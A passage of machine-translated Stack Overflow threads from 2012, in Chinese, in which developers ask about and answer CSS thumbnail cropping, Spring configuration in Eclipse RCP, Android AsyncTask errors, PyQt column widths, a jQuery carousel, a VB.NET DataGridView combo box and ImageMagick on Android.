我正在尝试通过显示缩略图以 HTML 格式创建专辑预览；所有缩略图都应定义为方形。

现在，当我尝试显示缩略图时，某些图像的分辨率会失真，否则在另一种情况下（即）如果我没有同时设置属性（高度和宽度），则图像来自 DIV并与其他图像重叠。

你能告诉我，如何在不损失图像分辨率的情况下显示图像，这样它们就不会从 div 中出来；我不介意图像是否被裁剪。

一个简单的解决方案很好，因为我正在使用表格，我不想为此使用 iFrame。谢谢！！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-25T17:20:46.257

`overflow: hidden`在你的 div 上使用

HTML：

```
<div class="thumbnail">
     <img src="images/thumb-01.png"/>
</div> 
```

CSS：

```
.thumbnail{
     overflow: hidden;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-25T17:19:38.903

如果您的每个图像都有自己的 div 父级，那么您可以在 div 上使用 css 溢出。从图像中删除高度和宽度。

```
div{
    overflow:hidden;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-12-15T06:56:07.073

这可以通过以下方法实现

HTML 代码

```
<div class="kq"><div class="img_div"><img src = "sample.jpg" /></div></div> 
```

CSS 代码

```
.kq{
background: none repeat scroll 0 0 #FFFFFF;
border: 1px solid #CCCCCC;
border-radius: 3px;
font-family: 'Helvetica Neue',Helvetica,Arial,'lucida grande',tahoma,verdana,arial,sans-serif;
padding: 8px 12px 12px;
position: relative;
width : 60%;
margin : 0 auto;
margin-bottom:10px;
overflow: hidden; 
```

}

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-25T17:26:42.290

检查这个[小提琴](http://jsfiddle.net/Kar8J/)。为所有图像设置相同的宽度和高度

如果图像分辨率彼此差异很大，则使用`div`'s 而不是`img`并将图像作为背景。

在这种情况下，您可以使用

```
overflow:hidden;
background-size: 100px 100px; /* CSS3 */ 
```

使用[background-size](https://developer.mozilla.org/en-US/docs/CSS/background-size)您可以根据需要设置图像尺寸。

# java - Eclipse RCP 找不到 applicationContext.xml

> ID：12587908
> 
> 赞同：3
> 
> 时间：2012-09-25T17:16:06.383
> 
> 标签：java, spring, eclipse-plugin, eclipse-rcp

我在集成 Eclipse RCP 和 Spring IOC 时遇到了一些问题。

以下是我的处理方法。

我已经完成的步骤

1.  创建了一个包含所有 Spring jar 的 Bundle（使用现有档案项目类型的插件）。
2.  创建了一个带有视图的 Simple Hello RCP 应用程序。
3.  将 Bundle 作为依赖项添加到 RCP 项目（步骤 2）

在我的 RCP 项目中创建了一个简单的类，其对象必须通过 applicationContext.xml 实例化。

```
public class Triangle {
            public void draw(){
                System.out.println("Traingle drawn");
            }
       } 
```

我的 applicationContext.xml 代码

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE beans PUBLIC "-//SPRING//DTD BEAN 2.0//EN" "http://www.springframework.org/dtd/spring-beans-2.0.dtd">
<beans>
   <bean id="JGID" class="st.Triangle"/>
</beans> 
```

我正在获取 applicationContext.xml 的视图的代码片段部分如下

```
ApplicationContext applicationContext = new FileSystemXmlApplicationContext("D:/applicationContext.xml");
Triangle triangle = (Triangle) applicationContext.getBean("JGID");
triangle.draw(); 
```

这会引发错误

> 找不到文件 [D:\applicationContext.xml] 中定义的名称为“JGID”的 bean 的类 [st.Triangle]；嵌套异常是 java.lang.ClassNotFoundException: st.Triangle

如何解决此错误？

作为一种解决方法，我尝试了另一种方法，我也失败了，如下所示，即使用 ClassPathXmlApplicationContext

```
ApplicationContext applicationContext = new ClassPathXmlApplicationContext("applicationContext.xml"); 
```

下面是错误

> !MESSAGE Unable to create view ID st.view: IOException parsing XML document from class path resource [applicationContext.xml]; 嵌套异常是 java.io.FileNotFoundException：无法打开类路径资源 [applicationContext.xml]，因为它不存在！堆栈 0 java.io.FileNotFoundException：无法打开类路径资源 [applicationContext.xml]

我的 Eclipse RCP 应用程序中的上述代码行，它在哪里检查或查找 xml 文件。

我尝试了以下方法。

*   将 applicationContext.xml 放在 src 文件夹中。
*   在项目文件夹中。
*   在包装内。

在所有 3 种情况下，它都说`FileNotFoundException`. 我应该在哪里放置`applicationContext.xml`文件以进行`applicationContext`参考以找到它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-04T07:38:45.387

将`spring-context.xml`放在应用程序的类路径中，为了调用它，您需要以下代码

```
ApplicationContext ctx = new ClassPathXmlApplicationContext("spring-context.xml");
            Triangle triangle = (Triangle) ctx.getBean("jgid");
             triangle.draw(); 
```

[从本站](http://www.mkyong.com/spring/quick-start-maven-spring-example/)盗取

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-04T07:55:56.953

你确定三角形在“ctx”类路径中吗？

例如，您可以实例化另一个简单的 bean

`<bean id="str" class="java.lang.String" value="Hello World">`

然后打电话

`String str= (String) ctx.getBean("str");`

# android - 从 MySQL 数据库中检索不起作用

> ID：12587913
> 
> 赞同：0
> 
> 时间：2012-09-25T17:16:33.070
> 
> 标签：android, mysql, json

我有一个小问题：如果我想从我的数据库中检索所有课程列表作为列表视图，一切看起来都很好，但是如果我想单击其中一门课程来显示该课程的信息，它不起作用，这个问题是显示在 logcat 中：

```
 09-21 01:39:58.915: E/AndroidRuntime(6968): FATAL EXCEPTION: main
09-21 01:39:58.915: E/AndroidRuntime(6968): java.lang.NullPointerException
09-21 01:39:58.915: E/AndroidRuntime(6968):     at com.ksu.sms.ViewCourseStudent$GetCourseDetails.onPostExecute(ViewCourseStudent.java:142)
09-21 01:39:58.915: E/AndroidRuntime(6968):     at com.ksu.sms.ViewCourseStudent$GetCourseDetails.onPostExecute(ViewCourseStudent.java:1)
09-21 01:39:58.915: E/AndroidRuntime(6968):     at android.os.AsyncTask.finish(AsyncTask.java:602)
09-21 01:39:58.915: E/AndroidRuntime(6968):     at android.os.AsyncTask.access$600(AsyncTask.java:156)
09-21 01:39:58.915: E/AndroidRuntime(6968):     at android.os.AsyncTask$InternalHandler.handleMessage(AsyncTask.java:615)
09-21 01:39:58.915: E/AndroidRuntime(6968):     at android.os.Handler.dispatchMessage(Handler.java:99)
09-21 01:39:58.915: E/AndroidRuntime(6968):     at android.os.Looper.loop(Looper.java:137)
09-21 01:39:58.915: E/AndroidRuntime(6968):     at android.app.ActivityThread.main(ActivityThread.java:4340)
09-21 01:39:58.915: E/AndroidRuntime(6968):     at java.lang.reflect.Method.invokeNative(Native Method)
09-21 01:39:58.915: E/AndroidRuntime(6968):     at java.lang.reflect.Method.invoke(Method.java:511)
09-21 01:39:58.915: E/AndroidRuntime(6968):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
09-21 01:39:58.915: E/AndroidRuntime(6968):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
09-21 01:39:58.915: E/AndroidRuntime(6968):     at dalvik.system.NativeStart.main(Native Method) 
```

ViewCourseStudent.java 包 com.ksu.sms；

```
import android.app.Activity;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import android.app.ProgressDialog;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;

public class ViewCourseStudent extends Activity {
    TextView Name; TextView Description;
    TextView OfficeHours;
    TextView CreditHours;
    TextView MaxAbsenceDays;
    TextView ExamsDates ;
    JSONObject  course;
        String CourseID ;
        // Progress Dialog
        private ProgressDialog pDialog;

        // JSON parser class
        JSONParser jsonParser = new JSONParser();

        // single course url
        private static final String url_course_detials = "http://10.0.2.2/SmsPhp/view_course.php";
        //JSON Node names
        private static final String TAG_SUCCESS = "success";
        private static final String TAG_CourseID = "CourseID";
        private static final String TAG_course = "course";
        private static final String TAG_Name = "Name";
        private static final String TAG_OfficeHours = "OfficeHours";
        private static final String TAG_CreditHours = "CreditHours";
        private static final String TAG_Description = "Description";
        private static final String TAG_MaxAbsenceDays = "MaxAbsenceDays";
        private static final String TAG_ExamsDates = "ExamsDates";
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.view_course);

        Intent i = getIntent();
         CourseID = i.getStringExtra(TAG_CourseID);
         // Getting complete course details in background thread
         new GetCourseDetails().execute();

    }

    /**
     * Background Async Task to Get complete course details
     * */
    class GetCourseDetails extends AsyncTask<String, String, String> {

        /**
         * Before starting background thread Show Progress Dialog
         * */
        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            pDialog = new ProgressDialog(ViewCourseStudent.this);
            pDialog.setMessage("Loading course details. Please wait...");
            pDialog.setIndeterminate(false);
            pDialog.setCancelable(true);
            pDialog.show();
        }

    @Override
    protected String doInBackground(String... arg0) {
        // updating UI from Background Thread
                // Check for success tag
                int success;
                try {
                    // Building Parameters
                    List<NameValuePair> params = new ArrayList<NameValuePair>();
                    params.add(new BasicNameValuePair("CourseID", CourseID));

                    // getting course details by making HTTP request
                    // Note that product details url will use GET request
                    JSONObject json = jsonParser.makeHttpRequest(
                            url_course_detials, "GET", params);

                    // check your log for json response
                    Log.d("Single course Details", json.toString());

                    // json success tag
                    success = json.getInt(TAG_SUCCESS);
                    if (success == 1) {
                        // successfully received product details
                        JSONArray courseObj = json
                                .getJSONArray(TAG_course); // JSON Array

                        // get first course object from JSON Array
                        course = courseObj.getJSONObject(0);
                        // course with this course_id found
                        // textview Text
                        /*TextView Name; TextView Description;
    TextView OfficeHours;
    TextView CreditHours;
    TextView MaxAbsenceDays;
    TextView ExamsDates ;*/

                    }else{
                        // course with course id not found
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
        return null;
    }

    /**
     * After completing background task Dismiss the progress dialog
     * **/
    protected void onPostExecute(String file_url) {
        // dismiss the dialog once got all details
        pDialog.dismiss();

        try
        {
            Name = (TextView) findViewById(R.id.C_Name);
            Description = (TextView) findViewById(R.id.C_Des);
            CreditHours = (TextView) findViewById(R.id.C_Hours);
            OfficeHours=(TextView) findViewById(R.id.C_Ohour);
            MaxAbsenceDays=(TextView) findViewById(R.id.C_absence);
            ExamsDates=(TextView) findViewById(R.id.Add_C_Exam);
            // display product data in EditText
            Name.setText( course.getString(TAG_Name));
            Description.setText( course.getString(TAG_Description));
            OfficeHours.setText( course.getString(TAG_OfficeHours));
            MaxAbsenceDays.setText( course.getString(TAG_MaxAbsenceDays));
            ExamsDates.setText( course.getString(TAG_ExamsDates));
            CreditHours.setText( course.getString(TAG_CreditHours));
        }
        catch (JSONException e) {
            e.printStackTrace();
        }

        }
    }
} 
```

查看所有课程学生 .java

```
package com.ksu.sms;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import org.apache.http.NameValuePair;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.app.ListActivity;
import android.app.ProgressDialog;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.ListAdapter;
import android.widget.ListView;
import android.widget.SimpleAdapter;
import android.widget.TextView;
import android.widget.Toast;

public class ViewALLCourseStudent extends ListActivity {

    // Progress Dialog
    private ProgressDialog pDialog;

    // Creating JSON Parser object
    JSONParser jParser = new JSONParser(); //class
 boolean x =true; 
    ArrayList<HashMap<String, String>> coursesList;

    //url to get all products list
    private static String url_all_course = "http://10.0.2.2/SmsPhp/view_all_course.php";
    // JSON Node names
    private static final String TAG_SUCCESS = "success";
    private static final String TAG_course = "course";
    private static final String TAG_CourseID = "CourseID";
    private static final String TAG_Name = "Name";

    // course JSONArray
    JSONArray courses = null;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.view_all_course_student);

        coursesList = new ArrayList<HashMap<String, String>>();

        // Loading courses in Background Thread
        new LoadAllCourses().execute();

// updating listview 

        // Get list view
        ListView lv = getListView();
     // on seleting single course
        // launching Edit course Screen
        lv.setOnItemClickListener(new OnItemClickListener() {

             public void onItemClick(AdapterView<?> parent, View view,
                     int position, long id) //one of the list
             {
                 // getting values from selected ListItem
                 String CourseID = ((TextView) view.findViewById(R.id.CourseID)).getText()
                         .toString();
                 // Starting new intent
                 Intent ViewCourseStudent = new Intent(getApplicationContext(),
                         ViewCourseStudent.class);
                 // sending Course ID to next activity
                 ViewCourseStudent.putExtra(TAG_CourseID, CourseID);

                 // starting new activity and expecting some response back
                 startActivityForResult(ViewCourseStudent, 100);
             }
         });

     }
 // Response from view course Activity

    @Override
   protected void onActivityResult(int requestCode, int resultCode, Intent data)
    {
        super.onActivityResult(requestCode, resultCode, data);
        // if result code 100
        if (resultCode == 100) {
            // if result code 100 is received
            // means user view course
            // reload this screen again
            Intent intent = getIntent();
            finish();
            startActivity(intent);
        }

}
    /**
     * Background Async Task to Load all course by making HTTP Request
     * */
    class LoadAllCourses extends AsyncTask<String, String, String>
    {

        /**
         * Before starting background thread Show Progress Dialog
         * */
        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            pDialog = new ProgressDialog(ViewALLCourseStudent.this);
            pDialog.setMessage("Loading Courses. Please wait...");
            pDialog.setIndeterminate(false);
            pDialog.setCancelable(false);
            pDialog.show();
        }
        /**
         * getting All products from u r l
         * */
        @Override
        protected String doInBackground(String... args) {
            // Building Parameters
            List<NameValuePair> params = new ArrayList<NameValuePair>();
            // getting JSON string from URL
            JSONObject json = jParser.makeHttpRequest(url_all_course, "GET", params);

            // Check your log cat for JSON response
            Log.d("All courses: ", json.toString());

            try {
                // Checking for SUCCESS TAG
                int success = json.getInt(TAG_SUCCESS);

                if (success == 1) {
                    // course found
                    // Getting Array of course
                    courses = json.getJSONArray(TAG_course);

                    // looping through All courses
                    for (int i = 0; i < courses.length(); i++)//course JSONArray
                    {
                        JSONObject c = courses.getJSONObject(i); // read first

                        // Storing each json item in variable
                        String CourseID = c.getString(TAG_CourseID);
                        String Name = c.getString(TAG_Name);

                        // creating new HashMap
                        HashMap<String, String> map = new HashMap<String, String>();

                        // adding each child node to HashMap key => value
                        map.put(TAG_CourseID, CourseID);
                        map.put(TAG_Name, Name);

                        // adding HashList to ArrayList
                        coursesList.add(map);
                    }
                } else {
                    x=false;

                }

            } catch (JSONException e) {
                e.printStackTrace();
            }

            return null;
        }   

        /**
         * After completing background task Dismiss the progress dialog
         * **/
        protected void onPostExecute(String file_url) { 
              // dismiss the dialog after getting all products 
              pDialog.dismiss(); 
              if (x==false)
                Toast.makeText(getBaseContext(),"no course" ,Toast.LENGTH_LONG).show();

              ListAdapter adapter = new SimpleAdapter( 
                        ViewALLCourseStudent.this, coursesList, 
                        R.layout.list_item, new String[] { TAG_CourseID, 
                                TAG_Name}, 
                        new int[] { R.id.CourseID, R.id.Name }); 
               setListAdapter(adapter); 

             // Updating parsed JSON data into ListView 

        } 

    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T17:31:13.583

您收到此错误是因为您尝试从 doInBackground 方法访问 View 对象，例如 Name.setText(course.getString(TAG_Name)); 您必须将所有 UI 更新移至 onPostExecute 方法。

你能测试一下这个实现吗：

```
import android.app.Activity;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import android.app.ProgressDialog;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;

public class ViewCourseStudent extends Activity {
    TextView Name; TextView Description;
    TextView OfficeHours;
    TextView CreditHours;
    TextView MaxAbsenceDays;
    TextView ExamsDates ;

        String CourseID ;
        // Progress Dialog
        private ProgressDialog pDialog;

        // JSON parser class
        JSONParser jsonParser = new JSONParser();

        // single course url
        private static final String url_course_detials = "http://10.0.2.2/SmsPhp/view_course.php";
        //JSON Node names
        private static final String TAG_SUCCESS = "success";
        private static final String TAG_CourseID = "CourseID";
        private static final String TAG_course = "course";
        private static final String TAG_Name = "Name";
        private static final String TAG_OfficeHours = "OfficeHours";
        private static final String TAG_CreditHours = "CreditHours";
        private static final String TAG_Description = "Description";
        private static final String TAG_MaxAbsenceDays = "MaxAbsenceDays";
        private static final String TAG_ExamsDates = "ExamsDates";
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.view_course);

        Intent i = getIntent();
         CourseID = i.getStringExtra(TAG_CourseID);
         // Getting complete course details in background thread
         new GetCourseDetails().execute();

    }

    /**
     * Background Async Task to Get complete course details
     * */
    class GetCourseDetails extends AsyncTask<String, String, String> {

        private JSONObject  course;

        /**
         * Before starting background thread Show Progress Dialog
         * */
        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            pDialog = new ProgressDialog(ViewCourseStudent.this);
            pDialog.setMessage("Loading course details. Please wait...");
            pDialog.setIndeterminate(false);
            pDialog.setCancelable(true);
            pDialog.show();
        }

    @Override
    protected String doInBackground(String... arg0) {
        // updating UI from Background Thread
                // Check for success tag
                int success;
                try {
                    // Building Parameters
                    List<NameValuePair> params = new ArrayList<NameValuePair>();
                    params.add(new BasicNameValuePair("CourseID", CourseID));

                    // getting course details by making HTTP request
                    // Note that product details url will use GET request
                    JSONObject json = jsonParser.makeHttpRequest(
                            url_course_detials, "GET", params);

                    // check your log for json response
                    Log.d("Single course Details", json.toString());

                    // json success tag
                    success = json.getInt(TAG_SUCCESS);
                    if (success == 1) {
                        // successfully received product details
                        JSONArray courseObj = json
                                .getJSONArray(TAG_course); // JSON Array

                        // get first course object from JSON Array
                          course = courseObj.getJSONObject(0);

                    }else{
                        // course with course id not found
                        course = null;
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
        return null;
    }

    /**
     * After completing background task Dismiss the progress dialog
     * **/
    protected void onPostExecute(String file_url) {
        // dismiss the dialog once got all details
        pDialog.dismiss();

        if(course != null){
             Name = (TextView) findViewById(R.id.C_Name);
             Description = (TextView) findViewById(R.id.C_Des);
             CreditHours = (TextView) findViewById(R.id.C_Hours);
             OfficeHours=(TextView) findViewById(R.id.C_Ohour);
             MaxAbsenceDays=(TextView) findViewById(R.id.C_absence);
             ExamsDates=(TextView) findViewById(R.id.Add_C_Exam);
             // display product data in EditText
             Name.setText( course.getString(TAG_Name));
             Description.setText( course.getString(TAG_Description));
             OfficeHours.setText( course.getString(TAG_OfficeHours));
             MaxAbsenceDays.setText( course.getString(TAG_MaxAbsenceDays));
             ExamsDates.setText( course.getString(TAG_ExamsDates));
             CreditHours.setText( course.getString(TAG_CreditHours));
        }
    }
}
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T17:31:22.910

在您的班级`ViewCourseStudent`中，您有一个`AsyncTask`正在修改`Views`其`doInBackground()`方法的内容。

这导致`CalledFromWrongThreadException`. 该异常提供的消息几乎可以告诉您一切。

> 只有创建视图层次结构的原始线程才能接触其视图。

这意味着所有与 UI 相关的调用都不能在主 (UI) 线程之外完成。

如果您阅读`AsyncTask`参考资料，您会发现它`doInBackground()`在单独的线程上运行，从而导致此异常。

为了解决这个问题，您应该将所有与 UI 相关的代码`doInBackground()`从`onPostExecute()`.

与 UI 相关的代码是指以下部分：

```
Name = (TextView) findViewById(R.id.C_Name);
Description = (TextView) findViewById(R.id.C_Des);
...
ExamsDates.setText( course.getString(TAG_ExamsDates));
CreditHours.setText( course.getString(TAG_CreditHours)); 
```

# python - PyQt4新手：QColumnView用自定义模型自动设置列宽

> ID：12587915
> 
> 赞同：-1
> 
> 时间：2012-09-25T17:16:43.560
> 
> 标签：python, qt4, pyqt, pyqt4

我是 Qt4 新手，但我似乎无法在手册或网上找到我需要的信息：

我已经实现了一个非常简单的数据模型，其中 data() 方法响应 DisplayRole、ToolTipRole 和 DecorationRole 输入。我还没有实现 headerData() 方法（但我测试了下面列出的一个）。

当我将模型与 QColumnView 一起使用时，列的大小是固定的。我的数据模型中各个节点的宽度变化很大，所以我正在寻找一种方法让 QColumnView 根据 data() 方法返回的数据自动设置列的宽度。

我找不到任何可用于其他类型视图的“setResizeMode()”方法。我尝试从 data() 返回一个 QSize()，输入角色为 SizeHintRole，如下所示：

```
 text = str(node.display_name())
            value = QtCore.QSize(len(text)*10,20) 
```

奇怪的是高度似乎被调整了，但列的宽度仍然是恒定的。

我尝试实现如下所示的 headerData 方法：

```
def headerData(self, index, orientation, role ) :
    ret = QtGui.QHeaderView()
    ret.setResizeMode( QtGui.QtHeaderView.ResizeToContents )
    return ret 
```

但这没有任何效果；我确信标题视图需要以其他方式进行操作和设置，但我很难找出那是什么。

有人可以为新手指出正确的方向吗？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T09:05:49.340

您可以通过调用 setColumnWidths 方法重新排列宽度。例如，尝试将模型信号连接到这样的插槽，你就完成了。Slot 可以根据模型计算实际宽度并为 setColumnWidths 准备列表。

# jquery - 上一个和下一个按钮循环遍历数组

> ID：12587920
> 
> 赞同：-1
> 
> 时间：2012-09-25T17:17:28.743
> 
> 标签：jquery, arrays, loops, slider, carousel

我试图让以下内容循环通过项目（淡入/淡出）。但截至目前，当您单击 Prev & Next 按钮时，它只加载数组名称而不是内容。

我在这里设置了一个 JS Fiddle 文件。[http://jsfiddle.net/leemnelson_/Ur7SW/29/](http://jsfiddle.net/leemnelson_/Ur7SW/29/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:22:22.960

首先.. ID 应该是**唯一的**.. 而且你有这么多具有​​相同 ID 的元素。

尝试用类名替换相同的名称，这会使您的代码更清晰。

另外，当您可以简单地使用单个 div 进行导航时，为什么要一遍又一遍地使用相同的 Div 来使页面超载..

以及单独 div 中的项目 ..

**更新代码**

检查这个[小提琴](http://jsfiddle.net/sushanth009/Ur7SW/36/)

我已经对其进行了必要的修改，以使用加载项目的 Single Div 包装器

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-25T17:25:53.143

您正在加载整个数组并将其作为 HTML 放置。而是加载数组元素，如下所示：

```
$('.innerContent .projectInfo').html(webProjects[c]); 
```

并且您将数组值作为 HTML 放置，它将用数组替换按钮。尝试将数组值放在不包含按钮的单独 div 中。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-25T17:28:02.870

我认为这更接近您正在寻找的内容：http: [//jsfiddle.net/Ur7SW/33/](http://jsfiddle.net/Ur7SW/33/)

您正在将 设置`.html()`为数组中的字符串值。您需要对具有该 ID的***元素使用 jQuery。***

所以而不是：

```
$('.innerContent').html(webProjects); 
```

利用：

```
$('.innerContent').html($("#"+ webProjects[c])); 
```

看起来您之前的按钮仍有问题...我现在来看看。

* * *

还有其他问题。上一个按钮的问题、重复`id`的属性、重复使用相同的元素等。我已经在这个小提琴中修复了所有这些问题：http: [//jsfiddle.net/Ur7SW/49/](http://jsfiddle.net/Ur7SW/49/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-25T17:24:37.597

chk 更新的小提琴

[http://jsfiddle.net/Ur7SW/32/](http://jsfiddle.net/Ur7SW/32/)

文本应该进入`p`元素内部

希望这可以帮助！

# vb.net - 以编程方式更改 DataGridViewComboBox 显示成员

> ID：12587925
> 
> 赞同：1
> 
> 时间：2012-09-25T17:17:48.753
> 
> 标签：vb.net, winforms, datagridview

这是一个 vb.net winforms 应用程序。我在 datagridview 中有一个绑定的 DataGridViewCombo 框列。它允许用户选择 6 种不同的交易类型。现金交易和支票交易都具有相同的 ValueMember。决定 2 的区别是 Check Number 列是否有值。我的问题很容易在这里看到。两者相同的 ValueMember 使用 DisplayMember 为需要 checkNumber 的值设置值。这纯粹是为了用户体验，而不是为了在幕后将其保存为付款。这就像我需要的东西，当然它不正确，因为“支票付款”作为需要整数的 ValueMember 无效。

```
 For i As Integer = 0 To FinancialDataGridView.RowCount - 1
        If Not IsNothing(FinancialDataGridView.Rows(i).Cells(2).Value) Then
            FinancialDataGridView.Rows(i).Cells(5).Value = "Check Payment"
        End If

    Next 
```

![按钮列属性](../Images/bbbdd59433831a4924e9d4b7bdca03f2.png)

但它给出了我认为我可以去做的方式的想法。有什么想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-09T16:41:32.250

看看下面的代码，希望对你有帮助：

```
 For Each row As DataGridViewRow In FinancialDataGridView.Rows
        If Not IsNothing(row.Cells(2).Value) Then
            With CType(row.Cells(5), DataGridViewComboBoxCell)
                ' This gives you the ability to set the value member if you have the ID
                .ValueMember = 1
                ' This gives you the ability to set it by display memeber if you only have the string (Less safe)
                .DisplayMember = ("Your string")
            End With
        End If
    Next 
```

您将看到我已经更改了 for 循环，通过使用 for each 您可以在循环中访问整行。

通过将单元格键入 DataGridViewComboBoxCell，您可以访问显示成员和值成员。

# android - 使用 ImageMagick 时没有得到输出

> ID：12587928
> 
> 赞同：1
> 
> 时间：2012-09-25T17:17:58.777
> 
> 标签：android, imagemagick

我想在我的应用程序中使用 ImageMagick 库来处理与图像相关的东西。我已经为它制作了示例代码，但执行后，它只显示微调器，不显示处理后获得的图像。我不知道是什么问题？这是我正在使用的代码：

```
 public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.main);
        // InputStream stream = getResources().openRawResource(R.raw.app_notes);

        try {
            final MagickImage img = new MagickImage(new ImageInfo("/sdcard/newsample.jpeg"));

//          setContentView(R.layout.main);
            Spinner s = (Spinner) findViewById(R.id.spinner);

            ArrayAdapter adapter = ArrayAdapter.createFromResource(MainActivity.this,R.array.effects, android.R.layout.simple_spinner_item);
            adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
            s.setAdapter(adapter);

            s.setOnItemSelectedListener(new OnItemSelectedListener() {

                public void onItemSelected(AdapterView<?> parent, View view,
                        int pos, long id) {
                    ProgressThread t = new ProgressThread(img, pos);
                    //runOnUiThread(t);
                    t.run();
                }

                public void onNothingSelected(AdapterView<?> parent) {
                    // Do nothing.
                }
            });
            ImageView iv = (ImageView) findViewById(R.id.imageView);
            iv.setImageBitmap(MagickBitmap.ToBitmap(img));
        } catch (MagickApiException e) {
            e.printStackTrace();
        } catch (MagickException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

        /*
         * TextView tv = new TextView(this);
         * tv.setText(DisplayImageMetaData.displayMagickImage(img));
         * setContentView(tv);
         */
        int count = 2;
        MagickImage images[] = new MagickImage[count];
        for (int i = 0; i < count; i++) {
            String path = "/mnt/sdcard/" + String.valueOf(i + 1) + ".jpeg";
            try {
                images[i] = new MagickImage(new ImageInfo(path));
            } catch (MagickException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
        try {
            MagickImage image = new MagickImage(images);
            image.setImageFormat("gif");
            String fn = Environment.getExternalStorageDirectory() + "/Pictures/test.gif";
            image.setFileName(fn);
            ImageInfo info = new ImageInfo(fn);
            info.setMagick("gif");
            //image.writeImage(info);
            byte blob[] = image.imageToBlob(info);
            FileOutputStream fos = new FileOutputStream(fn);
            fos.write(blob);
            fos.close();
            FileOutputStream testOS = new FileOutputStream("/mnt/sdcard/test.txt");
            testOS.write("abc".getBytes());
            testOS.close();
        } catch (MagickException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (FileNotFoundException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }

    protected Dialog onCreateDialog(int id, Bundle bundle) {
        switch (id) {
        case PROGRESS_DIALOG:
            /*
             * ProgressDialog dialog =
             * ProgressDialog.show(AndroidMagickActivity.this, "",
             * "Loading. Please wait...", true);
             */
            progressDialog = new ProgressDialog(MainActivity.this);
            progressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
            progressDialog.setMessage("Loading...");
            return progressDialog;
            // return dialog;
        default:
            return null;
        }
    }

    /** Nested class that performs progress calculations (counting) */
    private class ProgressThread extends Thread {

        MagickImage img;
        int pos;

        ProgressThread(MagickImage image, int pos) {
            this.img = image;
            this.pos = pos;
        }

        public void run() {
            int effect = 0;
            MainActivity.this.showDialog(PROGRESS_DIALOG);
            switch (pos) {
            case 1:
                effect = NoiseType.UndefinedNoise;
                break;
            case 2:
                effect = NoiseType.UniformNoise;
                break;
            case 3:
                effect = NoiseType.GaussianNoise;
                break;
            case 4:
                effect = NoiseType.MultiplicativeGaussianNoise;
                break;
            case 5:
                effect = NoiseType.ImpulseNoise;
                break;
            case 6:
                effect = NoiseType.LaplacianNoise;
                break;
            case 7:
                effect = NoiseType.PoissonNoise;
                break;
            }
            Bitmap bitmap = null;
            try {
                ImageView iv = (ImageView) findViewById(R.id.imageView);

                MagickImage image = null;
                if (pos < 8)
                    image = img.addNoiseImage(effect);
                else if (pos == 9)
                    image = img.blurImage(5, 1);
                else if (pos == 10)
                    image = img.charcoalImage(5, 1);
                else if (pos == 11)
                    image = img.edgeImage(0);
                if (image != null) {

                    bitmap = MagickBitmap.ToBitmap(image);
                    iv.setImageBitmap(bitmap);
                }

                MainActivity.this.dismissDialog(PROGRESS_DIALOG);
            } catch (MagickException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
    } 
```

这是xml文件：

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent" >

    <Spinner
        android:id="@+id/spinner"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content" />

    <ImageView
        android:id="@+id/imageView"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
    />

</LinearLayout> 
```

这是日志文件：

```
09-25 22:45:13.322: V/Magick(554): Attempting to read from file /mnt/sdcard/1.jpeg
09-25 22:45:13.741: V/Magick(554): ReadImage completed
